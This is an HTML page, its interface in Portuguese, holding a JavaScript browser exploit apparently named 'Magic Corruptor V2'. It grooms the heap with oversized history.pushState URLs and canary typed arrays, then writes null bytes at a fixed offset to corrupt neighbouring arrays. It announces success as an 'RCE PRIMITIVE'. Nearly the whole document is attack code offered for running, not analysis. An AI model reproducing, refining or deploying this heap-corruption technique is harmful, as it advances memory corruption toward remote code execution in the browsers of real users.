<!DOCTYPE html>
<html>
<head>
    <title>Magic Corruptor V2 (Manual)</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        #log { border: 1px solid #333; padding: 10px; height: 400px; overflow-y: scroll; white-space: pre-wrap; font-size: 14px;}
        .btn { 
            padding: 20px; font-size: 1.2em; cursor: pointer; 
            background: #222; color: #fff; border: 2px solid #0f0; margin-bottom: 10px; width: 100%;
        }
        .btn:hover { background: #333; }
        .win { color: #ffff00; font-weight: bold; background: #440000; padding: 5px; }
    </style>
</head>
<body>

<h1>Magic Corruptor V2</h1>
<p>Controle manual para evitar travamento.</p>

<button class="btn" onclick="runPhase1()">PASSO 1: PREPARAR HEAP (Spray + Compact)</button>
<button class="btn" onclick="runPhase2()" id="btnAttack" style="border-color: red; color: red;">PASSO 2: ATACAR (128 Bytes Zeros)</button>

<div id="log">Aguardando...</div>

<script>
    const BASE_OFFSET = 709522; 
    var victims = []; 

    function log(msg, type='') {
        const el = document.getElementById('log');
        const color = type === 'win' ? '#ffff00' : (type === 'err' ? '#ff5555' : '#00ff00');
        el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
        el.scrollTop = el.scrollHeight;
    }

    async function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

    function makeGroomPayload(size) {
        let s = "";
        for(let i=0; i<size; i++) s += String.fromCharCode((i % 32) + 1);
        return s;
    }

    // --- FASE 1: PREPARAÇÃO ---
    async function runPhase1() {
        log("=== INICIANDO PREPARAÇÃO ===", 'win');
        victims = [];
        
        // Reduzimos o teto para 40.000 para evitar o OOM no final
        const MAX_SIZE = 40000; 
        
        log("[1] Spray Incremental com Vítimas...");
        
        try {
            for(let size = 1000; size <= MAX_SIZE; size += 2000) {
                // Grooming
                let payload = "/" + "A".repeat(BASE_OFFSET) + makeGroomPayload(size);
                history.pushState({}, `groom_${size}`, payload);
                
                // Vítima (Canário)
                let v = new Uint32Array(32); 
                v.fill(0x13371337); 
                v.magic = size; 
                victims.push(v);

                // Pausa para UI atualizar a cada 5 iterações
                if(size % 10000 === 0) {
                    log(`    ...${size} bytes alocados.`);
                    await wait(100); 
                }
            }
        } catch(e) {
            log(`[!] Aviso durante spray: ${e.message}`, 'err');
        }

        log("[2] Compactando (Suave)...");
        await wait(500);

        // Reduzimos de 100 para 20 iterações para não travar
        for(let i=0; i<20; i++) {
             history.pushState({}, `pattern_${i}`, "/" + "A".repeat(BASE_OFFSET) + "\x09\x20".repeat(50));
             if(i % 5 === 0) await wait(50);
        }
        
        log("HEAP PRONTO. Aguarde 5 segundos antes de atacar...", 'win');
    }

    // --- FASE 2: ATAQUE ---
    async function runPhase2() {
        log("=== INICIANDO ATAQUE (ZEROS) ===", 'win');
        
        let success = false;
        
        // Tenta escrever 128 bytes de zeros
        // Isso deve zerar o Header + Dados do array vizinho
        try {
            let buffer = "A".repeat(BASE_OFFSET);
            let attack = "\x00".repeat(128); 
            
            // Dispara 3 vezes
            for(let k=0; k<3; k++) {
                history.pushState({}, `PWN_${k}`, "/" + buffer + attack);
                await wait(100);
            }
            
            log("Ataque enviado. Verificando vítimas...");
            
            // VERIFICAÇÃO
            for(let i=0; i<victims.length; i++) {
                let v = victims[i];
                
                // Checa Tamanho
                if (v.length !== 32) {
                    log(`!!! JACKPOT !!! Vítima ${i} TAMANHO MUDOU: ${v.length}`, 'win');
                    success = true;
                }
                
                // Checa Conteúdo (Primeiro elemento deve ser 0x13371337)
                // Se for 0, foi sobrescrito!
                if (v[0] !== 0x13371337) {
                    log(`!!! JACKPOT !!! Vítima ${i} CONTEÚDO ZERADO! Valor: ${v[0]}`, 'win');
                    success = true;
                }

                if (success) {
                    alert("RCE PRIMITIVE UNLOCKED!\nCorrupção confirmada.");
                    break;
                }
            }
            
            if(!success) log("[-] Nenhuma corrupção detectada. Tente rodar o Ataque novamente.");

        } catch(e) {
            log(`[!] Erro no ataque: ${e.message}`, 'err');
        }
    }
</script>
</body>
</html>
